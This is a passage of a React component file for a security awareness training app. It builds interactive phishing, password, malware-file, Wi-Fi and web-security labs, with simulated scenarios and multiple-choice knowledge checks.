import React, { useState, useEffect, useCallback, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { motion, AnimatePresence } from 'framer-motion';
import { Icon } from '@iconify/react';
import {
  Shield, ShieldCheck, ShieldAlert, KeyRound, Globe, Mail, Bug, Wifi,
  Siren, ArrowLeft, ChevronRight, ChevronDown, ChevronUp, CheckCircle2,
  XCircle, AlertTriangle, Info, RefreshCw, Play, RotateCcw, Trophy,
  BookOpen, Target, Clock, Star, Layers, Lock, CreditCard, Link,
  Eye, EyeOff, X, Check, AlertCircle, Sparkles, FileText,
  BarChart3, Zap, Terminal, GraduationCap, Radar, Activity,
  Upload, Network,
} from 'lucide-react';
import { IC } from '../utils/icons';
import {
  SIMULATIONS, PHISHING_SCENARIOS, NETWORK_SCENARIOS,
  INCIDENT_SCENARIOS, SUSPICIOUS_FILE_SCENARIOS, DIFFICULTY_COLORS,
} from '../utils/simulationScenarios';
import {
  getProgress, markSimulationComplete, addTopicExplored, resetProgress,
} from '../utils/simProgress';
import { analyzePassword } from '../utils/passwordAnalyzer';
import { generateSecurePassword } from '../utils/passwordGenerator';

// ─── Iconify icon resolver for simulation modules ─────────────────────────────

const SIM_ICON_MAP = {
  Mail:     IC.simPhishing,
  Bug:      IC.simMalware,
  Wifi:     IC.simNetwork,
  Globe:    IC.simWebSec,
  Shield:   IC.simPrivacy,
  KeyRound: IC.simPassword,
  Siren:    IC.simIncident,
};

// Renders a vivid Iconify icon for simulation modules
const SimIcon = ({ name, size = 28, className = '' }) => {
  const iconStr = SIM_ICON_MAP[name] || IC.shield;
  return <Icon icon={iconStr} width={size} height={size} className={className} />;
};

const resolveIcon = (name) => {
  return function ResolvedSimIcon({ className = '', size = 28 }) {
    const iconStr = SIM_ICON_MAP[name] || IC.shield;
    return <Icon icon={iconStr} width={size} height={size} className={className} />;
  };
};

// ─── Animation variants ───────────────────────────────────────────────────────

const fadeUp = {
  hidden: { opacity: 0, y: 20 },
  visible: { opacity: 1, y: 0, transition: { type: 'spring', stiffness: 90, damping: 18 } },
};

const stagger = {
  hidden: { opacity: 0 },
  visible: { opacity: 1, transition: { staggerChildren: 0.08 } },
};

// ─── Difficulty color helper ──────────────────────────────────────────────────

const diffBadge = (d) => DIFFICULTY_COLORS[d] || 'bg-slate-800 text-slate-300 border-slate-700';

// ─── Sub-components ───────────────────────────────────────────────────────────

/** Glowing status pill */
const StatusPill = ({ active }) => (
  <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-cyan-500/10 border border-cyan-500/30 text-cyan-400 text-xs font-semibold tracking-widest uppercase">
    <span className="w-1.5 h-1.5 rounded-full bg-cyan-400 animate-pulse" />
    Interactive Learning Environment
  </div>
);

/** Progress stats card */
const StatCard = ({ label, value, icon: Icon, color }) => (
  <div className="flex flex-col items-center justify-center p-4 rounded-2xl bg-slate-900/60 border border-slate-800/80 min-w-0">
    <div className={`w-10 h-10 rounded-xl flex items-center justify-center mb-2 ${color}`}>
      <Icon className="w-5 h-5" />
    </div>
    <div className="text-2xl font-black text-white tabular-nums">{value}</div>
    <div className="text-xs text-slate-400 text-center mt-0.5 font-medium">{label}</div>
  </div>
);

// ─── Phishing Simulation ──────────────────────────────────────────────────────

const PhishingSim = ({ onComplete }) => {
  const [scenarioIdx, setScenarioIdx] = useState(0);
  const [stage, setStage] = useState('intro'); // intro | inspect | decide | result | done
  const [selectedChoice, setSelectedChoice] = useState(null);
  const [highlightedFlags, setHighlightedFlags] = useState([]);
  const [score, setScore] = useState(0);
  const scenario = PHISHING_SCENARIOS[scenarioIdx];

  const handleChoiceSubmit = (choice) => {
    setSelectedChoice(choice);
    if (choice.correct) setScore(s => s + 50);
    setStage('result');
  };

  const handleNext = () => {
    if (scenarioIdx < PHISHING_SCENARIOS.length - 1) {
      setScenarioIdx(i => i + 1);
      setStage('intro');
      setSelectedChoice(null);
      setHighlightedFlags([]);
    } else {
      onComplete(score + (selectedChoice?.correct ? 0 : 0));
      setStage('done');
    }
  };

  if (stage === 'done') {
    return (
      <motion.div variants={fadeUp} initial="hidden" animate="visible"
        className="text-center py-12 space-y-4">
        <Trophy className="w-16 h-16 text-yellow-400 mx-auto" />
        <h3 className="text-2xl font-black text-white">Phishing Lab Complete!</h3>
        <p className="text-slate-400">You analyzed {PHISHING_SCENARIOS.length} realistic phishing scenarios.</p>
        <div className="inline-block px-6 py-3 rounded-2xl bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 font-bold text-lg">
          Score: {score} / {PHISHING_SCENARIOS.length * 50}
        </div>
      </motion.div>
    );
  }

  return (
    <motion.div variants={stagger} initial="hidden" animate="visible" className="space-y-5">
      {/* Progress */}
      <div className="flex items-center justify-between text-xs text-slate-400">
        <span>Scenario {scenarioIdx + 1} of {PHISHING_SCENARIOS.length}</span>
        <span className="font-mono text-cyan-400">Score: {score}</span>
      </div>
      <div className="w-full h-1.5 bg-slate-800 rounded-full">
        <div className="h-1.5 bg-gradient-to-r from-rose-500 to-orange-400 rounded-full transition-all duration-500"
          style={{ width: `${((scenarioIdx) / PHISHING_SCENARIOS.length) * 100}%` }} />
      </div>

      {/* Scenario Header */}
      <motion.div variants={fadeUp} className="flex items-center gap-3">
        <div className="w-10 h-10 rounded-xl bg-rose-500/10 border border-rose-500/30 flex items-center justify-center">
          <Mail className="w-5 h-5 text-rose-400" />
        </div>
        <div>
          <h3 className="font-bold text-white">{scenario.title}</h3>
          <p className="text-xs text-slate-400">⚠️ SIMULATED SCENARIO — Educational Content Only</p>
        </div>
      </motion.div>

      {/* Simulated Email */}
      <motion.div variants={fadeUp} className="rounded-2xl bg-slate-950/80 border border-slate-700/60 overflow-hidden">
        <div className="px-5 py-3 border-b border-slate-800 bg-slate-900/60 flex items-center gap-2">
          <Mail className="w-4 h-4 text-slate-400" />
          <span className="text-xs font-semibold text-slate-300">Simulated Email Message</span>
          <span className="ml-auto px-2 py-0.5 rounded-full bg-amber-500/10 border border-amber-500/30 text-amber-400 text-[10px] font-bold">SIMULATION</span>
        </div>
        <div className="p-5 space-y-3">
          <div className="grid grid-cols-[auto_1fr] gap-x-3 gap-y-1 text-xs">
            <span className="text-slate-500 font-semibold">From:</span>
            <span className="text-rose-400 font-mono">{scenario.email.from}</span>
            <span className="text-slate-500 font-semibold">Display Name:</span>
            <span className="text-slate-300">{scenario.email.displayName}</span>
            <span className="text-slate-500 font-semibold">Subject:</span>
            <span className="text-slate-200 font-semibold">{scenario.email.subject}</span>
          </div>
          <div className="mt-3 p-4 rounded-xl bg-slate-900 border border-slate-800 text-sm text-slate-300 whitespace-pre-wrap leading-relaxed font-mono text-xs">
            {scenario.email.body}
          </div>
        </div>
      </motion.div>

      {/* Red Flags Inspector */}
      {stage === 'intro' && (
        <motion.div variants={fadeUp}>
          <p className="text-sm text-slate-400 mb-3">
            <AlertTriangle className="inline w-4 h-4 text-amber-400 mr-1" />
            Spot the red flags. Click each suspicious element to reveal why it's dangerous:
          </p>
          <div className="flex flex-wrap gap-2">
            {scenario.email.redFlags.map((flag, i) => (
              <button key={i}
                onClick={() => setHighlightedFlags(prev =>
                  prev.includes(i) ? prev.filter(x => x !== i) : [...prev, i]
                )}
                className={`px-3 py-1.5 rounded-xl text-xs font-mono border transition-all ${
                  highlightedFlags.includes(i)
                    ? 'bg-rose-500/10 border-rose-500/40 text-rose-300'
                    : 'bg-slate-800 border-slate-700 text-slate-400 hover:border-rose-500/40'
                }`}>
                {flag.phrase}
              </button>
            ))}
          </div>
          <AnimatePresence>
            {highlightedFlags.map(i => (
              <motion.div key={i} initial={{ opacity: 0, height: 0 }} animate={{ opacity: 1, height: 'auto' }}
                exit={{ opacity: 0, height: 0 }}
                className="mt-2 p-3 rounded-xl bg-rose-500/5 border border-rose-500/20 text-xs text-rose-300 flex items-start gap-2">
                <AlertTriangle className="w-3.5 h-3.5 text-rose-400 flex-shrink-0 mt-0.5" />
                <span><strong className="text-rose-300">"{scenario.email.redFlags[i].phrase}"</strong> — {scenario.email.redFlags[i].reason}</span>
              </motion.div>
            ))}
          </AnimatePresence>
          <motion.button
            whileHover={{ scale: 1.02 }} whileTap={{ scale: 0.98 }}
            onClick={() => setStage('decide')}
            className="mt-4 w-full py-3 rounded-2xl bg-gradient-to-r from-rose-600 to-orange-500 text-white font-bold text-sm shadow-lg shadow-rose-500/20 flex items-center justify-center gap-2">
            <ChevronRight className="w-4 h-4" /> Make Your Decision
          </motion.button>
        </motion.div>
      )}

      {/* Decision Stage */}
      {stage === 'decide' && (
        <motion.div variants={stagger} initial="hidden" animate="visible" className="space-y-3">
          <p className="text-sm font-semibold text-slate-300">What would you do with this message?</p>
          {scenario.choices.map((choice) => (
            <motion.button key={choice.id} variants={fadeUp}
              onClick={() => handleChoiceSubmit(choice)}
              className="w-full text-left p-4 rounded-2xl border border-slate-700/60 bg-slate-900/60 hover:border-rose-500/40 hover:bg-slate-900 transition-all text-sm text-slate-300 flex items-center gap-3">
              <span className="w-7 h-7 rounded-full bg-slate-800 border border-slate-700 flex items-center justify-center text-xs font-bold text-slate-400 flex-shrink-0">
                {choice.id.toUpperCase()}
              </span>
              {choice.text}
            </motion.button>
          ))}
        </motion.div>
      )}

      {/* Result Stage */}
      {stage === 'result' && selectedChoice && (
        <motion.div variants={fadeUp} initial="hidden" animate="visible" className="space-y-4">
          <div className={`p-5 rounded-2xl border ${
            selectedChoice.correct
              ? 'bg-emerald-500/10 border-emerald-500/30'
              : 'bg-rose-500/10 border-rose-500/30'
          }`}>
            <div className="flex items-center gap-2 mb-2">
              {selectedChoice.correct
                ? <CheckCircle2 className="w-5 h-5 text-emerald-400" />
                : <XCircle className="w-5 h-5 text-rose-400" />}
              <span className={`font-bold ${selectedChoice.correct ? 'text-emerald-300' : 'text-rose-300'}`}>
                {selectedChoice.correct ? '✓ Correct Decision' : '✗ Unsafe Choice'}
              </span>
              {selectedChoice.correct && (
                <span className="ml-auto text-emerald-400 font-bold text-sm">+50 pts</span>
              )}
            </div>
            <p className="text-sm text-slate-300 leading-relaxed">{selectedChoice.feedback}</p>
          </div>
          {!selectedChoice.correct && (
            <div className="p-4 rounded-2xl bg-blue-500/5 border border-blue-500/20 text-xs text-blue-300">
              <strong className="block text-blue-300 mb-1">💡 Better approach:</strong>
              {scenario.choices.filter(c => c.correct).map(c => c.text).join(' OR ')}
            </div>
          )}
          <motion.button whileHover={{ scale: 1.02 }} whileTap={{ scale: 0.98 }}
            onClick={handleNext}
            className="w-full py-3 rounded-2xl bg-gradient-to-r from-rose-600 to-orange-500 text-white font-bold text-sm shadow-lg flex items-center justify-center gap-2">
            {scenarioIdx < PHISHING_SCENARIOS.length - 1 ? (
              <><ChevronRight className="w-4 h-4" /> Next Scenario</>
            ) : (
              <><Trophy className="w-4 h-4" /> Complete Lab</>
            )}
          </motion.button>
        </motion.div>
      )}
    </motion.div>
  );
};

// ─── Password Simulation ──────────────────────────────────────────────────────

const PasswordSim = ({ onComplete }) => {
  const [pwd, setPwd] = useState('');
  const [analysis, setAnalysis] = useState(null);
  const [showPwd, setShowPwd] = useState(false);
  const [generated, setGenerated] = useState('');
  const [quizAnswer, setQuizAnswer] = useState(null);
  const [stage, setStage] = useState('lab'); // lab | quiz | done

  useEffect(() => {
    if (pwd.length === 0) { setAnalysis(null); return; }
    try { setAnalysis(analyzePassword(pwd)); } catch { /* noop */ }
  }, [pwd]);

  const strengthColor = (score) => {
    if (!score && score !== 0) return 'bg-slate-700';
    if (score < 2) return 'bg-rose-500';
    if (score < 3) return 'bg-orange-500';
    if (score < 4) return 'bg-amber-500';
    return 'bg-emerald-500';
  };

  const handleGenerate = () => {
    try {
      const p = generateSecurePassword({ length: 20, includeSymbols: true, includeNumbers: true, includeUppercase: true, includeLowercase: true });
      setGenerated(p);
    } catch {
      const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789!@#$%^&*';
      setGenerated(Array.from(crypto.getRandomValues(new Uint8Array(20)), b => chars[b % chars.length]).join(''));
    }
  };

  const QUIZ_CHOICES = [
    { id: 'a', text: 'password123', correct: false },
    { id: 'b', text: 'Tr0ub4dor&3', correct: false },
    { id: 'c', text: 'correct-horse-battery-staple', correct: true },
    { id: 'd', text: 'P@ssw0rd!', correct: false },
  ];

  if (stage === 'done') return (
    <div className="text-center py-12 space-y-4">
      <Trophy className="w-16 h-16 text-yellow-400 mx-auto" />
      <h3 className="text-2xl font-black text-white">Password Lab Complete!</h3>
      <p className="text-slate-400">You explored password strength analysis, secure generation, and passphrase advantages.</p>
      <div className="inline-block px-6 py-3 rounded-2xl bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 font-bold text-lg">
        Score: {quizAnswer?.correct ? 100 : 50} / 100
      </div>
    </div>
  );

  return (
    <motion.div variants={stagger} initial="hidden" animate="visible" className="space-y-6">
      {stage === 'lab' && (
        <>
          {/* Password Strength Tester */}
          <motion.div variants={fadeUp} className="rounded-2xl bg-slate-900/70 border border-slate-800 p-5 space-y-4">
            <div className="flex items-center gap-2 mb-1">
              <KeyRound className="w-4 h-4 text-cyan-400" />
              <h4 className="font-bold text-white text-sm">Interactive Strength Tester</h4>
              <span className="ml-auto text-xs text-slate-500 italic">Nothing is transmitted or stored</span>
            </div>
            <div className="relative">
              <input
                type={showPwd ? 'text' : 'password'}
                value={pwd}
                onChange={e => setPwd(e.target.value)}
                placeholder="Type any password to analyze locally..."
                className="w-full bg-slate-950 border border-slate-700 rounded-xl px-4 py-3 pr-12 text-sm text-white placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-cyan-500 font-mono"
                maxLength={128}
              />
              <button onClick={() => setShowPwd(v => !v)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-400">
                {showPwd ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
              </button>
            </div>
            {analysis && (
              <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="space-y-3">
                <div className="space-y-1">
                  <div className="flex justify-between text-xs text-slate-400">
                    <span>Strength</span>
                    <span className={`font-bold ${
                      analysis.score >= 4 ? 'text-emerald-400' : analysis.score >= 3 ? 'text-amber-400' : 'text-rose-400'
                    }`}>{analysis.label || ['Very Weak','Weak','Fair','Strong','Very Strong'][analysis.score] || 'Unknown'}</span>
                  </div>
                  <div className="h-2 bg-slate-800 rounded-full overflow-hidden">
                    <div className={`h-full rounded-full transition-all duration-500 ${strengthColor(analysis.score)}`}
                      style={{ width: `${((analysis.score + 1) / 5) * 100}%` }} />
                  </div>
                </div>
                {analysis.suggestions?.length > 0 && (
                  <div className="space-y-1">
                    {analysis.suggestions.slice(0, 3).map((s, i) => (
                      <div key={i} className="flex items-start gap-2 text-xs text-slate-400">
                        <AlertTriangle className="w-3 h-3 text-amber-400 mt-0.5 flex-shrink-0" />
                        {s}
                      </div>
                    ))}
                  </div>
                )}
              </motion.div>
            )}
          </motion.div>

          {/* Password Generator */}
          <motion.div variants={fadeUp} className="rounded-2xl bg-slate-900/70 border border-slate-800 p-5 space-y-3">
            <div className="flex items-center gap-2">
              <Sparkles className="w-4 h-4 text-violet-400" />
              <h4 className="font-bold text-white text-sm">Secure Password Generator</h4>
            </div>
            <p className="text-xs text-slate-400">Passwords are generated using cryptographically secure randomness, entirely in your browser.</p>
            <button onClick={handleGenerate}
              className="w-full py-3 rounded-xl bg-gradient-to-r from-violet-600 to-purple-600 text-white font-bold text-sm flex items-center justify-center gap-2">
              <RefreshCw className="w-4 h-4" /> Generate Secure Password
            </button>
            {generated && (
              <div className="p-3 rounded-xl bg-slate-950 border border-slate-800 font-mono text-xs text-emerald-400 break-all select-all">
                {generated}
              </div>
            )}
          </motion.div>

          {/* Key Facts */}
          <motion.div variants={fadeUp} className="grid grid-cols-1 sm:grid-cols-2 gap-3">
            {[
              { title: 'Passphrases', desc: '"correct-horse-battery-staple" is more secure AND memorable than "Tr0ub4d0r&3"', icon: BookOpen, color: 'text-cyan-400' },
              { title: 'Password Reuse', desc: 'One breached website can expose all accounts using the same password', icon: AlertTriangle, color: 'text-rose-400' },
              { title: 'MFA', desc: 'Even a compromised password cannot access your account with MFA enabled', icon: Shield, color: 'text-emerald-400' },
              { title: 'Password Managers', desc: 'Use a reputable password manager to generate and store unique passwords for every site', icon: Lock, color: 'text-violet-400' },
            ].map((fact, i) => (
              <div key={i} className="p-4 rounded-2xl bg-slate-900/60 border border-slate-800 space-y-1">
                <div className="flex items-center gap-2">
                  <fact.icon className={`w-4 h-4 ${fact.color}`} />
                  <span className="font-bold text-white text-sm">{fact.title}</span>
                </div>
                <p className="text-xs text-slate-400 leading-relaxed">{fact.desc}</p>
              </div>
            ))}
          </motion.div>

          <motion.button variants={fadeUp} whileHover={{ scale: 1.02 }} whileTap={{ scale: 0.98 }}
            onClick={() => setStage('quiz')}
            className="w-full py-3 rounded-2xl bg-gradient-to-r from-cyan-600 to-blue-600 text-white font-bold text-sm flex items-center justify-center gap-2">
            <ChevronRight className="w-4 h-4" /> Take Knowledge Check
          </motion.button>
        </>
      )}

      {stage === 'quiz' && (
        <motion.div variants={stagger} initial="hidden" animate="visible" className="space-y-4">
          <motion.div variants={fadeUp} className="p-5 rounded-2xl bg-slate-900/70 border border-slate-800">
            <h4 className="font-bold text-white mb-1">Knowledge Check</h4>
            <p className="text-sm text-slate-300">Which of these passwords would be hardest to crack using a brute-force dictionary attack?</p>
          </motion.div>
          {QUIZ_CHOICES.map(choice => (
            <motion.button key={choice.id} variants={fadeUp}
              onClick={() => { setQuizAnswer(choice); setStage('done'); onComplete(choice.correct ? 100 : 50); }}
              className="w-full text-left p-4 rounded-2xl border border-slate-700 bg-slate-900/60 hover:border-cyan-500/40 transition-all text-sm text-slate-300 flex items-center gap-3 font-mono">
              <span className="w-7 h-7 rounded-full bg-slate-800 border border-slate-700 flex items-center justify-center text-xs font-bold text-slate-400 flex-shrink-0">
                {choice.id.toUpperCase()}
              </span>
              {choice.text}
            </motion.button>
          ))}
        </motion.div>
      )}
    </motion.div>
  );
};

// ─── Malware File Awareness Sim ───────────────────────────────────────────────

const MalwareSim = ({ onComplete }) => {
  const [selectedFile, setSelectedFile] = useState(null);
  const [quizAnswer, setQuizAnswer] = useState(null);
  const [stage, setStage] = useState('inspect'); // inspect | quiz | done

  const riskColor = (risk) => ({
    Critical: 'text-rose-400 border-rose-500/30 bg-rose-500/5',
    High: 'text-orange-400 border-orange-500/30 bg-orange-500/5',
    Medium: 'text-amber-400 border-amber-500/30 bg-amber-500/5',
    Low: 'text-emerald-400 border-emerald-500/30 bg-emerald-500/5',
  }[risk] || 'text-slate-400 border-slate-700 bg-slate-900');

  const QUIZ = {
    q: 'A colleague sends you a file named "Salary_Hike_2024.pdf.exe". What is the actual file type?',
    choices: [
      { id: 'a', text: 'A PDF document', correct: false },
      { id: 'b', text: 'An executable program — the ".exe" is the real extension', correct: true },
      { id: 'c', text: 'Both a PDF and an executable', correct: false },
      { id: 'd', text: 'An image file', correct: false },
    ],
  };

  if (stage === 'done') return (
    <div className="text-center py-12 space-y-4">
      <Trophy className="w-16 h-16 text-yellow-400 mx-auto" />
      <h3 className="text-2xl font-black text-white">Malware Awareness Lab Complete!</h3>
      <p className="text-slate-400">You inspected {SUSPICIOUS_FILE_SCENARIOS.length} suspicious file types and learned safe handling procedures.</p>
      <div className="inline-block px-6 py-3 rounded-2xl bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 font-bold text-lg">
        Score: {quizAnswer?.correct ? 100 : 60} / 100
      </div>
    </div>
  );

  return (
    <motion.div variants={stagger} initial="hidden" animate="visible" className="space-y-5">
      <motion.div variants={fadeUp} className="p-4 rounded-2xl bg-violet-500/5 border border-violet-500/20 text-xs text-violet-300 flex items-start gap-2">
        <Info className="w-4 h-4 flex-shrink-0 mt-0.5" />
        <span>This is an <strong>educational inspection lab</strong>. All files below are simulated examples used to teach awareness. No actual malware is present or executed.</span>
      </motion.div>

      {SUSPICIOUS_FILE_SCENARIOS.map((file, i) => (
        <motion.div key={i} variants={fadeUp}
          onClick={() => setSelectedFile(selectedFile === i ? null : i)}
          className="rounded-2xl bg-slate-900/70 border border-slate-800 hover:border-violet-500/30 cursor-pointer transition-all overflow-hidden">
          <div className="p-4 flex items-center gap-4">
            <div className="w-10 h-10 rounded-xl bg-slate-800 border border-slate-700 flex items-center justify-center flex-shrink-0">
              <FileText className="w-5 h-5 text-violet-400" />
            </div>
            <div className="flex-1 min-w-0">
              <div className="font-mono text-sm text-white truncate">{file.name}</div>
              <div className="text-xs text-slate-400">{file.mimeType}</div>
            </div>
            <div className={`px-2.5 py-1 rounded-full text-xs font-bold border ${riskColor(file.risk)}`}>
              {file.risk}
            </div>
            <ChevronDown className={`w-4 h-4 text-slate-500 transition-transform ${selectedFile === i ? 'rotate-180' : ''}`} />
          </div>
          <AnimatePresence>
            {selectedFile === i && (
              <motion.div initial={{ height: 0, opacity: 0 }} animate={{ height: 'auto', opacity: 1 }}
                exit={{ height: 0, opacity: 0 }}
                className="px-5 pb-5 space-y-3 border-t border-slate-800/60">
                <div className="grid grid-cols-2 gap-2 pt-3 text-xs">
                  <div className="p-2 rounded-lg bg-slate-950/60 border border-slate-800">
                    <span className="text-slate-500 block">Real Extension</span>
                    <span className="text-white font-mono font-bold">{file.extension}</span>
                  </div>
                  <div className="p-2 rounded-lg bg-slate-950/60 border border-slate-800">
                    <span className="text-slate-500 block">Displayed As</span>
                    <span className="text-white font-bold">{file.displayedAs}</span>
                  </div>
                </div>
                <p className="text-sm text-slate-300 leading-relaxed">{file.explanation}</p>
                <div className="p-3 rounded-xl bg-emerald-500/5 border border-emerald-500/20 text-xs text-emerald-300">
                  <strong>✓ Safe Action: </strong>{file.safeAction}
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </motion.div>
      ))}

      {stage === 'inspect' && (
        <motion.button variants={fadeUp} whileHover={{ scale: 1.02 }} whileTap={{ scale: 0.98 }}
          onClick={() => setStage('quiz')}
          className="w-full py-3 rounded-2xl bg-gradient-to-r from-violet-600 to-purple-600 text-white font-bold text-sm flex items-center justify-center gap-2">
          <ChevronRight className="w-4 h-4" /> Take Knowledge Check
        </motion.button>
      )}

      {stage === 'quiz' && (
        <motion.div variants={stagger} initial="hidden" animate="visible" className="space-y-3">
          <motion.div variants={fadeUp} className="p-5 rounded-2xl bg-slate-900/70 border border-slate-800">
            <h4 className="font-bold text-white mb-2">Knowledge Check</h4>
            <p className="text-sm text-slate-300">{QUIZ.q}</p>
          </motion.div>
          {QUIZ.choices.map(c => (
            <motion.button key={c.id} variants={fadeUp}
              onClick={() => { setQuizAnswer(c); setStage('done'); onComplete(c.correct ? 100 : 60); }}
              className="w-full text-left p-4 rounded-2xl border border-slate-700 bg-slate-900/60 hover:border-violet-500/40 transition-all text-sm text-slate-300 flex items-center gap-3">
              <span className="w-7 h-7 rounded-full bg-slate-800 border border-slate-700 flex items-center justify-center text-xs font-bold flex-shrink-0">
                {c.id.toUpperCase()}
              </span>
              {c.text}
            </motion.button>
          ))}
        </motion.div>
      )}
    </motion.div>
  );
};

// ─── Network Security Sim ─────────────────────────────────────────────────────

const NetworkSim = ({ onComplete }) => {
  const [selected, setSelected] = useState(null);
  const [quizAnswer, setQuizAnswer] = useState(null);
  const [stage, setStage] = useState('explore');

  const QUIZ = {
    q: 'You are at an airport and need to check your banking app urgently. What should you do?',
    choices: [
      { id: 'a', text: 'Connect to the free airport Wi-Fi — it is convenient', correct: false, feedback: 'Open public networks expose your traffic. An attacker nearby could intercept it.' },
      { id: 'b', text: 'Use your mobile data connection instead', correct: true, feedback: 'Correct! Mobile data is encrypted at the network level and far safer than open public Wi-Fi.' },
      { id: 'c', text: 'Use the airport Wi-Fi only after typing HTTPS manually', correct: false, feedback: 'HTTPS protects data in transit but DNS leaks and MITM attacks can still occur on open networks.' },
      { id: 'd', text: 'Ask the cafe staff if the network is safe', correct: false, feedback: 'Cafe staff cannot verify network security. Use mobile data or a trusted VPN.' },
    ],
  };

  if (stage === 'done') return (
    <div className="text-center py-12 space-y-4">
      <Trophy className="w-16 h-16 text-yellow-400 mx-auto" />
      <h3 className="text-2xl font-black text-white">Network Security Lab Complete!</h3>
      <div className="inline-block px-6 py-3 rounded-2xl bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 font-bold text-lg">
        Score: {quizAnswer?.correct ? 100 : 50} / 100
      </div>
    </div>
  );

  const riskBadge = { Critical: 'text-rose-400 border-rose-500/30 bg-rose-500/5', Medium: 'text-amber-400 border-amber-500/30 bg-amber-500/5', Low: 'text-emerald-400 border-emerald-500/30 bg-emerald-500/5' };

  return (
    <motion.div variants={stagger} initial="hidden" animate="visible" className="space-y-5">
      <motion.div variants={fadeUp} className="p-4 rounded-2xl bg-emerald-500/5 border border-emerald-500/20 text-xs text-emerald-300 flex items-start gap-2">
        <Info className="w-4 h-4 flex-shrink-0 mt-0.5" />
        <span>All network scenarios below are simulated for educational purposes. No real network scanning occurs.</span>
      </motion.div>

      <motion.div variants={fadeUp}>
        <h4 className="text-sm font-bold text-slate-300 mb-3">Simulated Wi-Fi Network Inspector — Click a network to inspect:</h4>
        <div className="space-y-3">
          {NETWORK_SCENARIOS.map((net, i) => (
            <div key={i}
              onClick={() => setSelected(selected === i ? null : i)}
              className="rounded-2xl bg-slate-900/70 border border-slate-800 hover:border-emerald-500/30 cursor-pointer transition-all overflow-hidden">
              <div className="p-4 flex items-center gap-4">
                <Wifi className={`w-5 h-5 flex-shrink-0 ${net.risk === 'Critical' ? 'text-rose-400' : net.risk === 'Medium' ? 'text-amber-400' : 'text-emerald-400'}`} />
                <div className="flex-1">
                  <div className="font-mono text-sm text-white">{net.name}</div>
                  <div className="text-xs text-slate-400">{net.security}</div>
                </div>
                <span className={`px-2.5 py-1 rounded-full text-xs font-bold border ${riskBadge[net.risk] || 'text-slate-400 border-slate-700'}`}>{net.risk}</span>
                <ChevronDown className={`w-4 h-4 text-slate-500 transition-transform ${selected === i ? 'rotate-180' : ''}`} />
              </div>
              <AnimatePresence>
                {selected === i && (
                  <motion.div initial={{ height: 0, opacity: 0 }} animate={{ height: 'auto', opacity: 1 }} exit={{ height: 0, opacity: 0 }}
                    className="px-5 pb-5 space-y-3 border-t border-slate-800/60">
                    <div className="grid grid-cols-2 gap-2 pt-3 text-xs">
                      <div className="p-2 rounded-lg bg-slate-950/60 border border-slate-800"><span className="text-slate-500 block">Encryption</span><span className="text-white font-mono font-bold">{net.encryption}</span></div>
                      <div className="p-2 rounded-lg bg-slate-950/60 border border-slate-800"><span className="text-slate-500 block">Risk Level</span><span className={`font-bold ${net.risk === 'Critical' ? 'text-rose-400' : net.risk === 'Medium' ? 'text-amber-400' : 'text-emerald-400'}`}>{net.risk}</span></div>
                    </div>
                    <p className="text-sm text-slate-300">{net.description}</p>
                    <div className="space-y-1">{net.risks.map((r, ri) => <div key={ri} className="flex items-center gap-2 text-xs text-rose-300"><AlertTriangle className="w-3 h-3" />{r}</div>)}</div>
                    <div className="space-y-1">{net.recommendations.map((r, ri) => <div key={ri} className="flex items-center gap-2 text-xs text-emerald-300"><Check className="w-3 h-3" />{r}</div>)}</div>
                  </motion.div>
                )}
              </AnimatePresence>
            </div>
          ))}
        </div>
      </motion.div>

      {/* Key Concepts */}
      <motion.div variants={fadeUp} className="grid grid-cols-1 sm:grid-cols-2 gap-3">
        {[
          { title: 'HTTPS', desc: 'Encrypts data between your browser and the server. Always look for the padlock icon.', icon: Lock, color: 'text-cyan-400' },
          { title: 'VPN', desc: 'Encrypts your traffic and masks your IP, but does not make you fully anonymous.', icon: Shield, color: 'text-emerald-400' },
          { title: 'Firewall', desc: 'Filters network traffic based on rules — a first line of defense at both home and enterprise level.', icon: Layers, color: 'text-violet-400' },
          { title: 'DNS Security', desc: 'Use DNS-over-HTTPS (DoH) to prevent ISPs and attackers from seeing which sites you visit.', icon: Globe, color: 'text-blue-400' },
        ].map((fact, i) => (
          <div key={i} className="p-4 rounded-2xl bg-slate-900/60 border border-slate-800 space-y-1">
            <div className="flex items-center gap-2"><fact.icon className={`w-4 h-4 ${fact.color}`} /><span className="font-bold text-white text-sm">{fact.title}</span></div>
            <p className="text-xs text-slate-400 leading-relaxed">{fact.desc}</p>
          </div>
        ))}
      </motion.div>

      <motion.button variants={fadeUp} whileHover={{ scale: 1.02 }} whileTap={{ scale: 0.98 }}
        onClick={() => setStage('quiz')}
        className="w-full py-3 rounded-2xl bg-gradient-to-r from-emerald-600 to-teal-600 text-white font-bold text-sm flex items-center justify-center gap-2">
        <ChevronRight className="w-4 h-4" /> Take Knowledge Check
      </motion.button>

      {stage === 'quiz' && (
        <motion.div variants={stagger} initial="hidden" animate="visible" className="space-y-3">
          <motion.div variants={fadeUp} className="p-5 rounded-2xl bg-slate-900/70 border border-slate-800">
            <h4 className="font-bold text-white mb-2">Situation</h4>
            <p className="text-sm text-slate-300">{QUIZ.q}</p>
          </motion.div>
          {QUIZ.choices.map(c => (
            <motion.button key={c.id} variants={fadeUp}
              onClick={() => { setQuizAnswer(c); setStage('done'); onComplete(c.correct ? 100 : 50); }}
              className="w-full text-left p-4 rounded-2xl border border-slate-700 bg-slate-900/60 hover:border-emerald-500/40 transition-all text-sm text-slate-300 flex items-center gap-3">
              <span className="w-7 h-7 rounded-full bg-slate-800 border border-slate-700 flex items-center justify-center text-xs font-bold flex-shrink-0">{c.id.toUpperCase()}</span>
              {c.text}
            </motion.button>
          ))}
        </motion.div>
      )}
    </motion.div>
  );
};

// ─── Web Security Sim ─────────────────────────────────────────────────────────

const WebSecSim = ({ onComplete }) => {
  const [activeTab, setActiveTab] = useState('https');
  const [quizDone, setQuizDone] = useState(false);
  const [score, setScore] = useState(0);

  const TABS = [
